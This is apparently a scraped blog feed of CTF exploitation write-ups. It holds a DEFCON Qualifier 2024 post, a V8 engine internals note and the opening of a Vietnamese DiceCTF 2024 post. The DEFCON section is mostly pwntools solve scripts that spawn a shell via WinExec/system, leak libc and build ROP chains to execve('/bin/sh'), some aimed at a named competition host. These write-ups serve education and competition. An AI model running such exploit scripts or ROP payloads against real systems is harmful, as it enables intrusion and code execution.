\u0026lt;__gi___libc_read+24\u0026gt;: ja 0x7ffff7d14840 \u0026lt;__gi___libc_read+112\u0026gt; the most important thing is that the __gi___libc_read function, as we would expect in a regular linux process waits for some input (via getchar()).\nif you restart the process and look at it again, you will see that the all libraries are mapped to different addresses each time, while the addresses of the \u0026lsquo;msvcrt.dll\u0026rsquo; libraries mostly remain the same.\nwhen it call to loadlibrary to get the base address of module msvcrt.dll\nhmodule msvcrt = loadlibrary(\u0026#34;msvcrt.dll\u0026#34;); printf(\u0026#34;msvcrt.dll:\\t\\t%p\\n\u0026#34;,msvcrt); in gdb, msvcrt.dll is passed to rcx register while rax store the address of loadlibrary function\n─────────────────────────────────────────────────────────────────[ disasm / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────── 0x7bb74ae6 add rsp, 0x20 rsp =\u0026gt; 0x7ffffe2ffe10 (0x7ffffe2ffdf0 + 0x20) 0x7bb74aea pop r12 r12 =\u0026gt; 16 0x7bb74aec ret \u0026lt;0x14000160e\u0026gt; ↓ 0x14000160e lea rcx, [rip + 0x7a2e] rcx =\u0026gt; 0x140009043 ◂— \u0026#39;msvcrt.dll\u0026#39; 0x140001615 mov rax, qword ptr [rip + 0xbc10] rax, [0x14000d22c] =\u0026gt; 0x6fffffa8ea14 ◂— lea rsp, [rsp] ► 0x14000161c call rax \u0026lt;0x6fffffa8ea14\u0026gt; finally, let\u0026rsquo;s get our hands dirty.\nsource-code overview first, it uses the dll specified by us to call the loadlibrarya function.\nrespond to us with the resulting module handle. using the api name specified on the client side and the module handle in the result of step 1, call the getprocaddress function on the server side to get the function address\nfinally, using the 64-bit integer specified by the client side as an argument, the function address of the result of step 2 is called on the server side. returns the result of the call to the client.\nnote that the distribution file also includes kernel32.dll and msvcrt.dll.\nsolution method 1 i call the malloc function of msvcrt.dll with an appropriate size as an argument to allocate memory and obtain the address. i call the gets function of msvcrt.dll with the address in step 1 as an argument, then enter the command \u0026lsquo;/bin/bash\u0026rsquo; =)) call \u0026lsquo;winexec\u0026rsquo; and pass the address of the string as an argument, and we get a shell. i founded that /root/.wine/dosdevices/z: is just a symlink to /\nsince the original winexec function is a function that takes two arguments, it seems that an indefinite value will be entered in the second argument ucmdshow in this execution method. however, it may be that the ucmdshow argument is a value that does not affect cui programs.\nmethod 2 in this way, i do the same as above, but instead of calling the winexec function, i call the system function of the module msvcrt.dll\nfrom pwn import * host = \u0026#34;0\u0026#34; port = 1337 if args.local: io = process([\u0026#34;wine\u0026#34;, \u0026#34;challenge.exe\u0026#34;]) else: io = remote(host, int(port)) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;malloc\u0026#39;) io.sendline(str(0x100).encode()) io.recvuntil(b\u0026#39;result: \u0026#39;) out = io.recvuntil(b\u0026#39;\\r\\n\u0026#39;).strip() print(out) heap_addr = int(out.split(b\u0026#39;: \u0026#39;)[-1],16) print(hex(heap_addr)) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;gets\u0026#39;) io.sendline(str(heap_addr).encode()) io.sendline(b\u0026#39;/bin/bash\u0026#39;) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;puts\u0026#39;) io.sendline(str(heap_addr).encode()) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;system\u0026#39;) io.sendline(str(heap_addr).encode()) io.interactive() but when running, it failed and returned -1, i don\u0026rsquo;t know why it happened.\nif command is null and the command interpreter is found, returns a nonzero value. if the command interpreter isn\u0026rsquo;t found, returns 0 and sets errno to enoent. if command isn\u0026rsquo;t null, system returns the value that is returned by the command interpreter. it returns the value 0 only if the command interpreter returns the value 0. a return value of -1 indicates an error, and errno is set to one of the following values:\naccording to microsoft\u0026rsquo;s system function documentation, if calling the system function results in an error, it returns -1 and sets the error code to the global variable errno.\nso i leveraged the _get_errno function to to get the current value of the errno global variable.\nfrom pwn import * host = \u0026#34;0\u0026#34; port = 1337 if args.local: io = process([\u0026#34;wine\u0026#34;, \u0026#34;challenge.exe\u0026#34;]) else: io = remote(host, int(port)) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;malloc\u0026#39;) io.sendline(str(0x100).encode()) io.recvuntil(b\u0026#39;result: \u0026#39;) out = io.recvuntil(b\u0026#39;\\r\\n\u0026#39;).strip() heap_addr = int(out.split(b\u0026#39;: \u0026#39;)[-1],16) print(hex(heap_addr)) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;gets\u0026#39;) io.sendline(str(heap_addr).encode()) io.sendline(b\u0026#39;/bin/bash\\0\u0026#39;) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;puts\u0026#39;) io.sendline(str(heap_addr).encode()) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;system\u0026#39;) io.sendline(str(heap_addr).encode()) sleep(1) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;malloc\u0026#39;) io.sendline(str(0x100).encode()) io.recvuntil(b\u0026#39;result: \u0026#39;) io.recvuntil(b\u0026#39;result: \u0026#39;) io.recvuntil(b\u0026#39;result: \u0026#39;) io.recvuntil(b\u0026#39;result: \u0026#39;) out = io.recvuntil(b\u0026#39;\\r\\n\u0026#39;).strip() print(out) errno_ = int(out.split(b\u0026#39;: \u0026#39;)[-1],16) print(hex(errno_)) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;_get_errno\u0026#39;) io.sendline(str(errno_).encode()) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;puts\u0026#39;) io.sendline(str(errno_).encode()) print(io.recvline()) io.interactive() run this lead us know the value of errno variable is 2.\nb\u0026#34;alright, we\u0026#39;re calling it!\\r\\n\u0026#34; b\u0026#39;\\x02\\r\\n\u0026#39; b\u0026#39;result: 0\\r\\n\u0026#39; b\u0026#39;which module would you like to load?\\r\\n\u0026#39; by referring to this page, i see that enoent has a value equal to 2, so it\u0026rsquo;s equivalent to the error string the command interpreter can't be found.\nsolve script solve.py\nfrom pwn import * host = \u0026#34;0\u0026#34; port = 1337 if args.local: io = process([\u0026#34;wine\u0026#34;, \u0026#34;challenge.exe\u0026#34;]) else: io = remote(host, int(port)) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;malloc\u0026#39;) io.sendline(str(0x100).encode()) io.recvuntil(b\u0026#39;result: \u0026#39;) out = io.recvuntil(b\u0026#39;\\r\\n\u0026#39;).strip() print(out) heap_addr = int(out.split(b\u0026#39;: \u0026#39;)[-1],16) print(hex(heap_addr)) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;gets\u0026#39;) io.sendline(str(heap_addr).encode()) io.sendline(b\u0026#39;/bin/bash\u0026#39;) io.sendline(b\u0026#39;kernel32.dll\u0026#39;) io.sendline(b\u0026#39;winexec\u0026#39;) io.sendline(str(heap_addr).encode()) io.sendline(b\u0026#39;./submitter\u0026#39;) flag = io.recvline_contains(b\u0026#39;livectf{\u0026#39;).decode().strip() log.info(\u0026#39;flag: %s\u0026#39;, flag) solve1.py (didn\u0026rsquo;t work on remote)\nfrom pwn import * host = \u0026#34;0\u0026#34; port = 31337 if args.local: io = process([\u0026#34;wine\u0026#34;, \u0026#34;challenge.exe\u0026#34;]) else: io = remote(host, int(port)) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;malloc\u0026#39;) io.sendline(str(0x100).encode()) io.recvuntil(b\u0026#39;result: \u0026#39;) out = io.recvuntil(b\u0026#39;\\r\\n\u0026#39;).strip() heap_addr = int(out.split(b\u0026#39;: \u0026#39;)[-1],16) print(hex(heap_addr)) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;malloc\u0026#39;) io.sendline(str(0x100).encode()) io.recvuntil(b\u0026#39;result: \u0026#39;) out = io.recvuntil(b\u0026#39;\\r\\n\u0026#39;).strip() errno_ = int(out.split(b\u0026#39;: \u0026#39;)[-1],16) print(hex(errno_)) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;gets\u0026#39;) io.sendline(str(heap_addr).encode()) io.sendline(b\u0026#39;cmd.exe\u0026#39;) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;puts\u0026#39;) io.sendline(str(heap_addr).encode()) io.sendline(b\u0026#39;msvcrt.dll\u0026#39;) io.sendline(b\u0026#39;system\u0026#39;) io.sendline(str(heap_addr).encode()) io.interactive() pwn - ndles attachment\nsource-code overview this challenge provides a small game, we can define the length of the solution and the number of attempts to guess.\nthe 2 following structs which the challenge uses to handle the game.\ngame_t struct\nstruct game_t { uint8_t guess_cnt; struct guess_t guess[8]; struct guess_t sol; }; guess_t struct\nstruct guess_t { uint8_t letter_cnt; char letters[9]; }; bug if ( sol_length \u0026lt;= 10u ) { if ( guess_cnt \u0026lt;= 8u ) { game.guess_cnt = guess_cnt; game.sol.letter_cnt = sol_length; for ( i = 0; i \u0026lt; game.sol.letter_cnt; ++i ) game.sol.letters[i] = 0; for ( j = 0; j \u0026lt; game.guess_cnt; ++j ) { game.guess[j].letter_cnt = game.sol.letter_cnt; for ( k = 0; k \u0026lt; game.guess[j].letter_cnt; ++k ) *(\u0026amp;savedregs + 10 * j + k - 142) = 0; } if ( game.sol.letter_cnt ) game.sol.letters[0] = \u0026#39;r\u0026#39;; if ( game.sol.letter_cnt \u0026gt; 1u ) game.sol.letters[1] = \u0026#39;e\u0026#39;; if ( game.sol.letter_cnt \u0026gt; 2u ) game.sol.letters[2] = \u0026#39;v\u0026#39;; if ( game.sol.letter_cnt \u0026gt; 3u ) game.sol.letters[3] = \u0026#39;e\u0026#39;; if ( game.sol.letter_cnt \u0026gt; 4u ) game.sol.letters[4] = \u0026#39;r\u0026#39;; if ( game.sol.letter_cnt \u0026gt; 5u ) game.sol.letters[5] = \u0026#39;s\u0026#39;; if ( game.sol.letter_cnt \u0026gt; 6u ) game.sol.letters[6] = \u0026#39;e\u0026#39;; if ( game.sol.letter_cnt \u0026gt; 7u ) game.sol.letters[7] = \u0026#39;r\u0026#39;; if ( game.sol.letter_cnt \u0026gt; 8u ) game.sol.letters[8] = \u0026#39;s\u0026#39;; v13 = 0; for ( m = 0; m \u0026lt; game.guess_cnt; ++m ) { printf(\u0026#34;what is your guess #%d?\\n\u0026#34;, (unsigned int)(m + 1)); for ( n = 0; n \u0026lt; game.guess[m].letter_cnt; ++n ) { do v10 = getchar(); while ( ((*__ctype_b_loc())[(char)v10] \u0026amp; 0x2000) != 0 ); *(\u0026amp;savedregs + 10 * m + n - 142) = v10; } for ( ii = 0; ii \u0026lt;= m; ++ii ) print_guess(\u0026amp;game.guess[ii], \u0026amp;game.sol); v8 = 1; for ( jj = 0; jj \u0026lt; game.sol.letter_cnt; ++jj ) { if ( *(\u0026amp;savedregs + 10 * m + jj - 142) != game.sol.letters[jj] ) { v8 = 0; break; } } if ( v8 ) { v13 = 1; break; } } if ( v13 ) puts(\u0026#34;that\u0026#39;s the correct word! you win!\u0026#34;); else puts(\u0026#34;you couldn\u0026#39;t guess the word! you lose!\u0026#34;); return 0; } else { puts(\u0026#34;guess count too long!\u0026#34;); return 1; } } else { puts(\u0026#34;solution length too long!\u0026#34;); return 1; } } the only bug i founded in this main function is the one-byte overflow to the next struct because it\u0026rsquo;s allows us to define up to 10 of solution length =))\nso, i leveraged this to leak and did a basic bufferoverflow.\nsolve script from pwn import * host = \u0026#34;\u0026#34; port = 0 if args.local: io = process(\u0026#34;./challenge_patched\u0026#34;) if args.gdb: cmd = \u0026#34;\u0026#34;\u0026#34;\u0026#34; \u0026#34;\u0026#34;\u0026#34; gdb.attach(io, cmd) else: io = remote(host, port) libc = elf(\u0026#34;./libc.so.6\u0026#34;) io.sendlineafter(b\u0026#39; be?\\n\u0026#39;, b\u0026#39;10\u0026#39;) io.sendlineafter(b\u0026#39; get?\\n\u0026#39;, b\u0026#39;7\u0026#39;) io.sendlineafter(b\u0026#39;what is your guess #1?\\n\u0026#39;, b\u0026#39;123456789\\xff\u0026#39;) pay = b\u0026#39;a\u0026#39; * 9 + b\u0026#39;\\xff\u0026#39; + b\u0026#39;a\u0026#39; * (0x6c-10) + b\u0026#39;\\xff\u0026#39; pause() io.sendlineafter(b\u0026#39;what is your guess #2?\\n\u0026#39;, pay) leak = io.recvuntil(b\u0026#39;what is your guess #3?\\n\u0026#39;) leak = leak.replace(b\u0026#34;\\x1b[1;30;42m \u0026#34;, b\u0026#34;\u0026#34;).replace(b\u0026#34;\\x1b[1;30;43m \u0026#34;, b\u0026#34;\u0026#34;).replace(b\u0026#34;\\x1b[0m \u0026#34;, b\u0026#34;\u0026#34;) leak = leak.replace(b\u0026#34; \u0026#34;, b\u0026#34;\u0026#34;) libc.address = u64(leak[0x9b:0x9b+8]) - 0x29d90 log.info(\u0026#34;libc \u0026#34;+hex(libc.address)) pay = b\u0026#39;\\0\u0026#39; * (0x6c-10) + b\u0026#34;\\x81\u0026#34; pay += p64(libc.address+0x000000000002a3e5) + p64(next(libc.search(b\u0026#39;/bin/sh\u0026#39;))) pay += p64(libc.address+0x000000000002be51) + p64(0) pay += p64(libc.address+0x000000000011f2e7) + p64(0)*2 pay += p64(libc.sym.execve) io.sendline(pay.ljust(255, b\u0026#39;\\0\u0026#39;)) io.sendline(b\u0026#39;./submitter\u0026#39;) flag = io.recvline_contains(b\u0026#39;livectf{\u0026#39;).decode().strip() log.info(\u0026#39;flag: %s\u0026#39;, flag) pwn - dotcom attachment\nsource-code overview ╭─[nvm] as kyrie in ~/ctf/2024/defcon/dotcom 00:41:22 ╰──➤ tree . . ├── airbag ├── bailout ├── dockerfile ├── dotcom_market ├── libc.so.6 ├── packages.txt ├── run_on_socket.sh ├── seccomp.txt └── start.sh this challenge looks like the typical notes challenge, but there is a strong seccomp filter.\nit begins with installing some crash handlers and also opens the flag file. so, if we can control the flow, we can easily read the flag file.\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp) { setvbuf(stdout, 0ll, 2, 0ll); feenableexcept(13); install_crash_handler(11); install_crash_handler(6); install_crash_handler(5); install_crash_handler(8); install_crash_handler(4); install_crash_handler(7); install_crash_handler(2); open(\u0026#34;/flag1.txt\u0026#34;, 0); set_permissions(); create_new_graph(); } vulnerabilities uninitialized memory m = (market_model_0 *)malloc(end - p + 49); has_any = 0; if ( !isnan(values[0]) ) { has_any = 1; m-\u0026gt;supply = values[0]; } if ( !isnan(values[1]) ) { has_any = 1; m-\u0026gt;demand = values[1]; } if ( !isnan(values[2]) ) { has_any = 1; m-\u0026gt;income = 64.0 * values[2]; } if ( !isnan(values[3]) ) { has_any = 1; m-\u0026gt;employment = 64.0 * values[3]; } if ( !isnan(values[4]) ) { has_any = 1; m-\u0026gt;confidence = 64.0 * values[4]; } if ( !has_any ) { puts(\u0026#34;error! invalid model format, all values are nan\u0026#34;); abort(); } memcpy(m-\u0026gt;notes, p, note_len); m-\u0026gt;notes[note_len] = 0; for ( i = 0ll; i \u0026lt; 0x20; ++i ) { if ( !model_list[i] ) { model_list[i] = m; printf(\u0026#34;loaded model #%02lu... \\x1b[30;40m@%p\\x1b[0m\\n\u0026#34;, i, m); return m; } } since the value doesn\u0026rsquo;t overwrite when they are nan and because after malloc, the memory isn\u0026rsquo;t properly initialized. so we can leverage that to have a strong leak through the draw_graph function.\nstack overflow char *__cdecl find_abort_string(uint64_t rsp_0) { int i; // [rsp+14h] [rbp-3ch] uint64_t *p; // [rsp+18h] [rbp-38h] char format[32]; // [rsp+20h] [rbp-30h] byref uint64_t rsp_0a; // [rsp+40h] [rbp-10h] rsp_0a = rsp_0; memset(format, 0, sizeof(format)); p = (uint64_t *)rsp_0a; for ( i = 0; i \u0026lt; 500; ++i ) { if ( *p == \u0026#39;essa :)(\u0026#39; ) { strcpy(format, (const char *)p); return strdup(format); } ++p; } return 0ll; } in the crash handler, there is an obvious stack overflow when parsing the abort message cuz it uses the strcpy function.\nsince strcpy terminates when it encounters a null byte, we can\u0026rsquo;t perform a rop chain, so i will choose the following gadget to cause stack overflow again. fortunately, the stack address remains in the rdi register.\n.text:00000000004025a1 mov rax, cs:stdin_ptr .text:00000000004025a8 mov rdx, [rax] ; stream .text:00000000004025ab mov esi, 0c8h ; n .text:00000000004025b0 call _fgets trigger the bug first, i created 2 chunks of 0x400 size, then free 1 to make it into the unsorted bin\npwndbg\u0026gt; bins tcachebins empty fastbins empty unsortedbin all: 0xca62a0 —▸ 0x791d8281ace0 (main_arena+96) ◂— 0xca62a0 smallbins empty largebins empty so basically, allocate again and select the module 1 to leak our libc address\nfrom pwn import * context.log_level = \u0026#39;debug\u0026#39; if args.local: io = process([\u0026#39;./dotcom_market\u0026#39;]) if args.gdb: cmd = \u0026#34;\u0026#34;\u0026#34; b* free \u0026#34;\u0026#34;\u0026#34; gdb.attach(io, cmd) else: io = remote(\u0026#34;dotcom.shellweplayaga.me\u0026#34;, 10001) elf = elf(\u0026#34;./dotcom_market\u0026#34;) libc = elf(\u0026#34;./libc.so.6\u0026#34;) def import_module(model): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;0\u0026#39;) io.sendlineafter(b\u0026#39;| \u0026#39;, model) def trasting(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;66\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, str(idx).encode()) io.sendlineafter(b\u0026#39;| \u0026#39;, b\u0026#39;aaaa\u0026#39;) model = b\u0026#39;0|0|0|0|0|\u0026#39;+b\u0026#39;a\u0026#39;*0x400 import_module(str(len(model)).encode()+b\u0026#39;|\u0026#39;+model) import_module(str(len(model)).encode()+b\u0026#39;|\u0026#39;+model) trasting(1) nan = struct.unpack(\u0026#34;q\u0026#34;, struct.pack(\u0026#34;d\u0026#34;, float(\u0026#39;nan\u0026#39;)))[0] print(hex(nan)) model = str(nan).encode() + b\u0026#39;|0|0|0|0|\u0026#39; + b\u0026#39;a\u0026#39;*0x400 import_module(str(len(model)).encode()+b\u0026#39;|\u0026#39;+model) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) io.recvuntil(b\u0026#39;r = \u0026#39;) supply = 0x0bfa999999999999a leak = float(io.recvuntil(b\u0026#34; \u0026#34;, drop=true).decode()) packed_value = struct.pack(\u0026#39;q\u0026#39;, supply) supply_coefficient = struct.unpack(\u0026#39;d\u0026#39;, packed_value)[0] libc.address = u64(struct.pack(\u0026#34;d\u0026#34;, leak / supply_coefficient)) \u0026amp; ~0xfff - 0x21a000 log.info(\u0026#34;libc \u0026#34; + hex(libc.address)) io.interactive() solve script from pwn import * #context.log_level = \u0026#39;debug\u0026#39; if args.local: io = process([\u0026#39;./dotcom_market\u0026#39;]) if args.gdb: cmd = \u0026#34;\u0026#34;\u0026#34; b* crash_handler \u0026#34;\u0026#34;\u0026#34; gdb.attach(io, cmd) else: io = remote(\u0026#34;dotcom.shellweplayaga.me\u0026#34;, 10001) elf = context.binary = elf(\u0026#34;./dotcom_market\u0026#34;) libc = elf(\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;) def import_module(model): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;0\u0026#39;) io.sendlineafter(b\u0026#39;| \u0026#39;, model) def trasting(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;66\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, str(idx).encode()) io.sendlineafter(b\u0026#39;| \u0026#39;, b\u0026#39;aaaa\u0026#39;) model = b\u0026#39;0|0|0|0|0|\u0026#39;+b\u0026#39;a\u0026#39;*0x400 import_module(str(len(model)).encode()+b\u0026#39;|\u0026#39;+model) import_module(str(len(model)).encode()+b\u0026#39;|\u0026#39;+model) trasting(1) nan = struct.unpack(\u0026#34;q\u0026#34;, struct.pack(\u0026#34;d\u0026#34;, float(\u0026#39;nan\u0026#39;)))[0] print(hex(nan)) model = str(nan).encode() + b\u0026#39;|0|0|0|0|\u0026#39; + b\u0026#39;a\u0026#39;*0x400 import_module(str(len(model)).encode()+b\u0026#39;|\u0026#39;+model) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) io.recvuntil(b\u0026#39;r = \u0026#39;) leak = float(io.recvuntil(b\u0026#34; \u0026#34;, drop=true).decode()) libc.address = u64(struct.pack(\u0026#34;d\u0026#34;, leak * (-20))) \u0026amp; ~0xfff - 0x21a000 log.info(\u0026#34;libc \u0026#34; + hex(libc.address)) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) pl = b\u0026#39;1280|\u0026#39; pl += p64(0x65737341203a2928) // magic pl += b\u0026#39;a\u0026#39;*0x30 pl += p64(0x4025a1) pl += b\u0026#39;x\u0026#39;*(1284 - len(pl)) import_module(pl) rop = rop(libc) rop.read(3, libc.bss(), 0x100) rop.write(1, libc.bss(), 0x100) pl = 24*b\u0026#39;a\u0026#39; pl += bytes(rop) io.sendline(pl) io.interactive() references https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-170\nhttps://schlafwandler.github.io/posts/attacking-wine-part-i/\nhttps://github.com/nautilus-institute/quals-2024/tree/main\nhttps://www.pcre.org/\nhttps://github.com/pcre2project/pcre2\nhttps://wiki.winehq.org/wine_developer%27s_guide/debugging_wine\nhttps://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170\nhttps://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170\n","title":"DEFCON Qualifier 2024"},{"date":"2024-04-15","image":"","imageAlt":"","link":"https://w1n-gl0ry.github.io/posts/v8_note/","summary":"Writeup","tags":["ctf","pwn"],"text":"v8 note c++ intro v8 google\u0026rsquo;s open source javascript engine used for interpret and execute js code implemented in c++ parse js code, construct ast, jit compiled ast into assembly for execution compiler and optimization for v8 have 4 internal compilers the old baseline compiler: full-codegen. the old optimizing compiler: crankshaft. the new optimizing compiler: turbofan. the new baseline compiler: ignition. compiler history full-codegen : directly generates and executes assembly language from ast =\u0026gt; it is relatively fast, but the generated assembly language code has many redundant parts and there is room for optimization.\ncrankshaft : was introduced in 2010 to optimize code. turbofan : was introduced in 2015 to better adapt to the new javascript specification. ignition : introduced in 2017, which generates intermediate language (bytecode)\nsince 2018, full-codegen and crankshaft have been removed from v8. abstract syntax tree compiler \u0026amp;\u0026amp; optimization baseline compiler : full-codege\noptimization mechanism : hidden class, inline caching\noptimizing compiler: crankshaft, turbofan\nturbofan\noptimization mechanisms\noptimization 1: cache usage hidden class the value of each property is managed in the form of an array inline caching optimization 2: recompile to more efficient jit code crankshaft turbofan optimization goals are determined at runtime hidden class properties can easily be added or removed from an object after its instantiation var car = function(make,model) { this.make = make; this.model = model; } var mycar = new car(honda,accord); mycar.year = 2005; =\u0026gt; slower than orther languages\nonce the new function is declared, javascript will create hidden class c0.\nfunction point(x,y) { this.x = x; this.y = y; } var obj = new point(1,2); once the first statement “this.x = x” is executed, v8 will create a second hidden class called c1 that is based on c0\n=\u0026gt; everytime a new property is added to an object, the objects old hidden class is updated with a transition path to the new hidden class\nthis process is repeated when the statement “this.y = y” is executed\nhidden class transitions are dependent on the order in which properties are added to an object\ninline caching (future) garbage collection (future) build v8 depot_tools\ngit clone https://chromium.googlesource.com/chromium/tools/depot_tools.git vim /etc/profile add `export path=$path:\u0026#34;/path/to/depot_tools\u0026#34;` to `.profile` cd /depot_tools \u0026amp;\u0026amp; ./gclient ninja\ngit clone https://github.com/ninja-build/ninja.git cd ninja \u0026amp;\u0026amp; ./configure.py --bootstrap \u0026amp;\u0026amp; cd .. vim /etc/profile add `export path=$path:\u0026#34;/path/to/ninja\u0026#34;` to `.profile` source /etc/profile v8 source code\nfetch v8 patch \u0026amp; compile debug version\ncd v8 # git checkout ??? git reset --hard +hash gclient sync #apply patch git apply \u0026lt; \u0026#34;path/to/tctf.diff\u0026#34; tools/dev/v8gen.py x64.debug ninja -c out.gn/x64.debug #the result is in /out.gn/x64.debug/d8 #./tools/dev/gm.py x64.debug build with natives_blob.bin and snapshot_blob.bin\nv8_static_library = true v8_use_snapshot = true v8_use_external_startup_data = true add gdb extension\nsource /path/to/v8/tools/gdbinit source /path/to/v8/tools/gdb-v8-support.py debug\n%debugprint(a); %systembreak(); %collectgarbage(); # trigger garbage collection %optimizefunctiononnextcall(); # force jit compilation of a function use native syntax\n--trace-turbo --trace-opt --trace-deopt --trace-turbo-reduction v8 datatypes values dynamically typed language\naccomplished through a combination of pointer tagging and the use of dedicated type information objects, called maps.\njs data types in v8 are listed in \u0026ldquo;src/object.h\u0026rdquo;\n// inheritance hierarchy: // - object // - smi (immediate small integer) // - heapobject (superclass for everything allocated in the heap) // - jsreceiver (suitable for property access) // - jsobject // - jsarray // - jsarraybuffer // - jsarraybufferview // - jstypedarray // - jsdataview // - jsboundfunction // - jscollection // - jsset // - jsmap // - jsstringiterator // - jssetiterator // - jsmapiterator // - jsweakcollection // - jsweakmap // - jsweakset // - jsregexp // - jsfunction // - jsgeneratorobject // - jsglobalobject // - jsglobalproxy // - jsvalue // - jsdate // - jsmessageobject // - jsmodulenamespace // - jsv8breakiterator // if v8_intl_support enabled. ... notice: a javascript value is then represented as a tagged pointer of static type object*\non 32-bit archs: // formats of object::ptr_: // smi: [31 bit signed int] 0 // heapobject: [32 bit direct pointer] (4 byte aligned) | 01 on 64-bit archs: smi: [32 bit signed int] [31 bits unused] 0 heapobject: [64 bit direct pointer] | 01 =\u0026gt; all accesses to data members of a heapobject have to go through special accessors that take care of clearing the lsb.\nmaps key data structure in v8, containing information such as:\nthe dynamic type of the object, i.e. string, uint8array, heapnumber, \u0026hellip; the size of the object in bytes the properties of the object and where they are stored the type of the array elements, e.g. unboxed doubles or tagged pointers the prototype of the object if any in general there are three different regions in which property values can be stored:\ninside the object itself (\u0026ldquo;inline properties\u0026rdquo;) dynamically sized heap buffer (\u0026ldquo;out-of-line properties\u0026rdquo;) if the property name is an integer index [4], as array elements in a dynamically-sized heap array in 1 \u0026amp; 2, the map will store the slot number of the property value while in the last case the slot number is the element index.\nexample:\nlet o1 = {a: 42, b: 43}; let o2 = {a: 1337, b: 1338}; there will be two jsobjects and one map in memory : =\u0026gt; the map mechanism is also essential for garbage collection: when the collector processes an allocation (a heapobject), it can immediately retrieve information such as the object\u0026rsquo;s size and whether the object contains any other tagged pointers that need to be scanned by inspecting the map.\nsmi 31-bit signed integer (max: 0xfffffffe)\nif pass around the number \u0026gt; 31-bit singed integer, v8 has to create a box: the number is turned into a double, an object is created and the double is put inside of it.\nobjects an object is a collection of properties: key-value pairs\nwhen an object \u0026lsquo;obj\u0026rsquo; is created, v8 creates a new js object and allocates memory for it. the value of \u0026lsquo;obj\u0026rsquo; is the pointer to this js object.\na js object is composed of:\nmap: a pointer to the hidden class the object belongs to. properties: a pointer to an object containing named properties. properties added after initialization of the object are added to the properties store. elements: a pointer to an object containing numbered properties. in-object properties/fast properties: pointers to named properties defined at object initialization. the number of in-objects properties depend on the object. properties javascript objects can have arbitrary properties associated with them. the names of object properties (or keys) can contain any character and are always strings. any name used as a property key that is not a string is stringified via .tostring() method. thus, obj[\u0026ldquo;1\u0026rdquo;] and obj[1] are equal.\nnumbered (or indexed) properties named properties elements: numbered properties if the property key is a non-negative integer (0, 1, 2, etc), the property will be stored in the \u0026ldquo;elements\u0026rdquo; object. these properties are called elements. elements kind const a = [1, 2, 3];\nthe elements kind of the array \u0026lsquo;a\u0026rsquo; is packed_smi_elements.\nwhen adding a floating-point number to the same array, v8 changes its elements kind to packed_double_elements.\nwhen adding a string literal to the same array, v8 changes again its elements kind to packed_elements.\nconst a = [1, 2, 3]; // elements kind: packed_smi_elements a.push(4.5); // elements kind: packed_double_elements a.push(\u0026#39;a\u0026#39;); // elements kind: packed_elements named properties if the property key is not a non-negative integer, the property will be stored as an inline-object property or in the \u0026ldquo;properties\u0026rdquo; object.\nthe properties store is an object that can be either a fixed array or a dictionary.\nfast properties when the number of properties is low, the properties store is defined as an array by v8. slow properties however, if many properties get added and deleted from an object, it can result in significant time and memory overhead to maintain the descriptor array and hidden classes. primitive types number \u0026lsquo;a\u0026rsquo; is directly stored in the memory as a smi. variable \u0026lsquo;b\u0026rsquo; is a pointer that points to a map with the type *_number_type. strings a string variable points to a map with the type *_string_type. boolean a boolean variable points to a map with the type oddball_type. symbols a symbol variable points to a symbol structure. undefined an undefined variable points to a map with type oddball_type. null a null variable points to a map with type oddball_type.\nin javascript, the memory management is done by v8 and its garbage collector.\nturbofan - the optimizing compiler inside v8 (future) jit (future) v8 heap sandbox references https://juejin.cn/post/6844903937787559944\n","title":"V8 note"},{"date":"2024-02-02","image":"","imageAlt":"","link":"https://w1n-gl0ry.github.io/posts/dice-ctf/","summary":"DICE-CTF 2024 Quals Writeups","tags":["ctf","pwn"],"text":"lời nói đầu tuần cuối cùng của năm 2023, mình quyết định kết thúc năm 2023 này với giải dicectf. sau đây là writeups của 1 số bài mình làm được trong suốt giải.\npwn - babytalk source code overview đây là bài đầu tiên mình làm trong giải, và có vẻ là 1 challenge về heap khá dễ thở. challenge dưới dạng tệp elf 64-bit, full-mitigations, có 4 chức năng ╭─    ~/ctf/pwnable/2024/dicectf/baby-talk   ✔  w1n_gl0ry@phis1ng ─╮ ╰─ ./chall_patched ─╯ 1. str 2. tok 3. del 4. exit 